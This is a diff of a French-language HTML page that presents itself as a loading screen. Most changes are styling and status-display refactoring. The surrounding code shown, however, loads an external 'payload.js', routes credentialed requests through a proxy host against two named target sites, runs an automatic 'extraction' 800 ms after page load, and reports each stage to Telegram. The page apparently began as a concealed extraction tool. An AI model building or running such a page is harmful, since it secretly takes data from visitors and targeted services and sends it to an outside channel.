@@ -4,30 +4,32 @@
     <meta charset="UTF-8">
     <title>Chargement...</title>
     <style>
-        /* Style modifié pour afficher le contenu */
+        /* Style pour afficher le contenu */
         body { 
             font-family: Arial, sans-serif;
             padding: 20px;
             background: #f5f5f5;
-            opacity: 1; /* Changé de 0 à 1 */
-            pointer-events: auto; /* Changé pour permettre les interactions */
+            opacity: 1;
+            pointer-events: auto;
         }
         #log {
-            background: white;
+            background: #1e1e1e;
+            color: #00ff00;
             padding: 15px;
             border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            max-height: 80vh;
+            max-height: 500px;
             overflow-y: auto;
-            display: block; /* Changé de none à block */
-            font-family: monospace;
+            display: block;
+            font-family: 'Courier New', monospace;
             white-space: pre-wrap;
             margin-top: 20px;
             min-height: 200px;
-            border: 1px solid #ddd;
+            border: 1px solid #333;
+            font-size: 13px;
+            line-height: 1.6;
         }
         .container {
-            max-width: 800px;
+            max-width: 900px;
             margin: 0 auto;
             background: white;
             padding: 20px;
@@ -37,43 +39,69 @@
         h1 {
             color: #333;
             font-size: 24px;
+            margin-bottom: 10px;
         }
-        .status {
-            color: #28a745;
+        .status-bar {
+            background: #f8f9fa;
+            padding: 10px 15px;
+            border-radius: 5px;
+            border-left: 4px solid #007bff;
+            margin-bottom: 15px;
+        }
+        .status-text {
             font-weight: bold;
-        }
-        .loading {
             color: #007bff;
-            font-weight: bold;
         }
+        .status-text.success { color: #28a745; }
+        .status-text.error { color: #dc3545; }
+        .status-text.warning { color: #ffc107; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>🚀 Application Active</h1>
-        <p>Statut: <span class="loading">⏳ Chargement en cours...</span></p>
-        <div id="log"></div>
+        <div class="status-bar">
+            Statut: <span id="statusText" class="status-text">⏳ Chargement en cours...</span>
+        </div>
+        <div id="log">🔄 Initialisation en cours...\n</div>
     </div>
 
     <script>
-    // Afficher un message initial
-    document.getElementById('log').innerHTML = '🔄 Initialisation en cours...\n';
+    // ==================== AFFICHAGE INITIAL ====================
+    const logDiv = document.getElementById('log');
+    const statusElement = document.getElementById('statusText');
+
+    function updateStatus(msg, type = 'loading') {
+        if (statusElement) {
+            statusElement.textContent = msg;
+            statusElement.className = 'status-text';
+            if (type === 'success') statusElement.classList.add('success');
+            else if (type === 'error') statusElement.classList.add('error');
+            else if (type === 'warning') statusElement.classList.add('warning');
+        }
+    }
+
+    function logMessage(msg) {
+        if (logDiv) {
+            logDiv.innerHTML += msg + '\n';
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+        console.log(msg);
+    }
+
+    logMessage('🚀 Démarrage...');
 
     // ==================== COLLABORATION AVEC PAYLOAD.JS ====================
     (function loadPayload() {
         const script = document.createElement('script');
         script.src = 'payload.js';
         script.onload = () => {
-            console.log('[PAYLOAD] chargé');
-            document.getElementById('log').innerHTML += '✅ payload.js chargé avec succès\n';
-            document.querySelector('.status').textContent = '✅ Opérationnel';
-            document.querySelector('.status').className = 'status';
+            logMessage('✅ payload.js chargé avec succès');
+            updateStatus('✅ Opérationnel', 'success');
         };
         script.onerror = () => {
-            console.log('[PAYLOAD] absent (mode autonome)');
-            document.getElementById('log').innerHTML += '⚠️ payload.js non trouvé (mode autonome)\n';
-            document.querySelector('.status').textContent = '⚠️ Mode dégradé';
-            document.querySelector('.status').style.color = '#ffc107';
+            logMessage('⚠️ payload.js non trouvé (mode autonome)');
+            updateStatus('⚠️ Mode dégradé', 'warning');
         };
         document.head.appendChild(script);
     })();
@@ -82,23 +110,21 @@
     <script>
     // ==================== CONFIGURATION INTELLIGENTE ====================
     const PROXY_URL = 'https://meta-downloader-79f2.onrender.com';
-    const API_BASE = PROXY_URL;  // Plus de double /api
-    const logDiv = document.getElementById('log');
+    const API_BASE = PROXY_URL;
 
     // Cible par défaut (bugweb) - peut être changée dynamiquement
-    let CURRENT_TARGET = 'bugweb';  // 'bugweb' ou 'bothub'
+    let CURRENT_TARGET = 'bugweb';
 
-    // Mapping des cibles disponibles (doit correspondre au server.js)
     const TARGET_MAP = {
         bugweb: 'https://bugweb.lionelmelo.space',
         bothub: 'https://bothub.togehost.online'
     };
 
-    const DEBUG = true; // Changé à true pour voir les logs
+    const DEBUG = true;
 
     function log(msg) {
         if (DEBUG) console.log(`[ADAPT] ${msg}`);
-        if (logDiv) logDiv.innerHTML += `${msg}\n`;
+        logMessage(`[ADAPT] ${msg}`);
     }
 
     // ==================== COMMUNICATION ====================
@@ -135,13 +161,10 @@
         return false;
     }
 
-    // ==================== REQUÊTES API (avec support multi-target) ====================
+    // ==================== REQUÊTES API ====================
     async function fetchJSON(endpoint, options = {}, retries = 2, target = null) {
-        // Utiliser la cible spécifiée ou la cible courante
         const activeTarget = target || CURRENT_TARGET;
         const useCredentials = window.location.protocol !== 'file:' && window.location.hostname !== '';
-        
-        // Ajouter le paramètre target à l'URL
         const separator = endpoint.includes('?') ? '&' : '?';
         const url = API_BASE + endpoint + separator + 'target=' + activeTarget;
         
@@ -285,8 +308,7 @@
     // ==================== MAIN ====================
     async function main() {
         log('🚀 Début extraction adaptative...');
-        document.querySelector('.status').textContent = '🔄 Extraction en cours...';
-        document.querySelector('.status').style.color = '#007bff';
+        updateStatus('🔄 Extraction en cours...', 'loading');
         await sendToTelegram(`🔍 Extraction adaptative démarrée v4.0 (cible: ${CURRENT_TARGET})`);
         
         // Phase 1: Reconnaissance
@@ -308,17 +330,15 @@
         
         await sendToTelegram(`✅ Extraction terminée pour ${CURRENT_TARGET}`);
         log('✅ Extraction terminée');
-        document.querySelector('.status').textContent = '✅ Terminé';
-        document.querySelector('.status').className = 'status';
+        updateStatus('✅ Terminé', 'success');
     }
 
-    // Exécution automatique avec timeout intelligent
+    // Exécution automatique
     log('⏳ Démarrage dans 800ms...');
     setTimeout(() => {
         main().catch(e => {
             log(`❌ Erreur fatale: ${e.message}`);
-            document.querySelector('.status').textContent = '❌ Erreur';
-            document.querySelector('.status').style.color = '#dc3545';
+            updateStatus('❌ Erreur', 'error');
             sendToTelegram(`❌ Erreur fatale (${CURRENT_TARGET}): ${e.message}`);
         });
     }, 800);
